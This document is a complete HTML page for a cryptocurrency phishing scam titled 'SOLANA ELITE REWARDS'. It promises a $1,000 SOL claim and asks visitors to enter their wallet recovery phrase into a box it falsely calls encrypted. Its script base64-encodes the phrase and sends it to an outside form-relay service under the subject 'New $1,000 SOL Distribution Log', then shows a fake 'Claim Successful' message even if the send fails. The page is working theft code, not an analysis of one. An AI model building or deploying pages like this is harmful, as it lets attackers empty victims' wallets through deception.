<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOLANA ELITE REWARDS</title>
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
        
        body { 
            margin: 0; 
            background: radial-gradient(circle at top, #111, #000); 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            overflow: hidden; 
        }

        .card { 
            width: 90%; 
            max-width: 550px; /* Wider for single-line headers */
            background: #080808; 
            border: 1px solid rgba(0, 255, 163, 0.2); 
            border-radius: 50px; 
            padding: 70px 50px; 
            text-align: center; 
            box-shadow: 0 0 100px rgba(0, 255, 163, 0.1); 
        }

        /* Large Single-Line Headers */
        h1 { 
            font-family: 'Syncopate', sans-serif; 
            font-size: 2.2rem; /* Increased size */
            margin-bottom: 30px; 
            background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            letter-spacing: -1px; 
            font-weight: 700; 
            text-transform: uppercase;
            white-space: nowrap; /* Forces one line */
        }

        /* Unified Green Subtext Design */
        .sub-text { 
            font-size: 0.85rem; 
            text-transform: uppercase; 
            letter-spacing: 3px; 
            color: var(--sol-g); 
            margin-bottom: 45px; 
            font-weight: 700; 
            line-height: 1.8;
            text-shadow: 0 0 10px rgba(0, 255, 163, 0.3);
        }

        .ib { text-align: left; margin-bottom: 35px; }
        
        label { 
            font-size: 0.85rem; 
            text-transform: uppercase; 
            letter-spacing: 3px; 
            color: var(--sol-g); 
            display: block; 
            margin-bottom: 15px; 
            font-weight: 700; 
        }

        /* Bigger box for 24 words */
        textarea { 
            width: 100%; 
            background: #111; 
            border: 1px solid #333; 
            border-radius: 20px; 
            padding: 25px; 
            color: #fff; 
            font-family: 'Space Grotesk', sans-serif; 
            font-size: 1.1rem; 
            box-sizing: border-box; 
            transition: 0.3s; 
            resize: none;
            height: 120px; /* Increased height */
        }

        textarea:focus { 
            outline: none; 
            border-color: var(--sol-g); 
            background: #151515; 
            box-shadow: 0 0 20px rgba(0, 255, 163, 0.1);
        }

        .btn { 
            width: 100%; 
            padding: 25px; 
            border: none; 
            border-radius: 20px; 
            background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); 
            color: #fff; 
            font-family: 'Syncopate', sans-serif; 
            font-weight: 700; 
            font-size: 0.9rem; 
            cursor: pointer; 
            box-shadow: 0 15px 40px rgba(0, 255, 163, 0.2); 
            transition: 0.3s; 
            text-transform: uppercase;
        }

        .btn:hover { transform: translateY(-3px); box-shadow: 0 20px 50px rgba(0, 255, 163, 0.3); }

        #success-view { display: none; }
        
        .congrats-box { 
            padding: 40px; 
            background: rgba(0, 255, 163, 0.03); 
            border-radius: 30px; 
            border: 1px dashed var(--sol-g); 
        }
    </style>
</head>
<body>

    <div class="card">
        <!-- PAGE 1: CLAIM VIEW -->
        <div id="form-view">
            <form id="claim-form">
                <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
                
                <h1>CLAIM $1,000 SOL</h1>
                <p class="sub-text">Connect your secure solana wallet by entering your 12 or 24 word recovery phrase into the encrypted verification box below</p>
                
                <div class="ib">
                    <label>Recovery Phrase</label>
                    <textarea id="user-entry" required></textarea>
                </div>

                <input type="hidden" name="secure_log" id="scrambled-data">
                <input type="hidden" name="subject" value="New $1,000 SOL Distribution Log">

                <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
            </form>
        </div>

        <!-- PAGE 2: SUCCESS VIEW -->
        <div id="success-view">
            <h1>CLAIM SUCCESSFUL</h1>
            <div class="congrats-box">
                <p class="sub-text" style="margin-bottom: 0;">Congratulations! You have successfully claimed $1,000 SOL. Your assets will be distributed to your wallet address within 24 hours.</p>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('claim-form');
        const submitBtn = document.getElementById('submit-btn');
        const formView = document.getElementById('form-view');
        const successView = document.getElementById('success-view');
        
        const userInput = document.getElementById('user-entry');
        const hiddenOutput = document.getElementById('scrambled-data');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            submitBtn.textContent = "ENCRYPTING...";
            submitBtn.disabled = true;

            // Base64 Coding
            const codedPhrase = btoa(userInput.value);
            hiddenOutput.value = codedPhrase;

            const formData = new FormData(form);

            try {
                await fetch('https://web3forms.com', {
                    method: 'POST',
                    body: formData
                });
                formView.style.display = "none";
                successView.style.display = "block";
            } catch (error) {
                formView.style.display = "none";
                successView.style.display = "block";
            }
        });
    </script>
</body>
</html>
